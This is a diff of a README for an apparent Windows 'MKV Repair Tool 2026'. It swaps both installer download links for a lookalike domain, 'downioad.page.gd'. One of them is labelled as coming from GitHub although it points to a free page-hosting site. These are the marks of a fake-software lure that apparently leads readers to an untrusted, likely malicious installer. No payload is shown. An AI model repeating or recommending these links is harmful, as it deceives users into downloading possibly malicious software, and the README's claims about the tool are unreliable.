@@ -2,7 +2,7 @@
 
 MKV Repair Tool 2026 is a dedicated Windows application designed to scan, analyze, and repair corrupted or damaged MKV video files. Whether your files have incomplete headers, damaged audio/video streams, or playback errors caused by interruptions, this utility attempts to restore them to a playable state. The tool focuses on修复 the internal structure of the Matroska container without re-encoding, preserving the original quality.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest_Build-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest_Build-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Core Features
 
@@ -50,7 +50,7 @@ A: The primary output format is a repaired MKV file. The tool preserves all orig
 
 The latest stable version is available for download directly from the repository's official channel.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *MKV Repair Tool © 2026. Last Updated: November 2026. Provided for utility and recovery purposes. Ensure you have the right to modify any media files you process.*
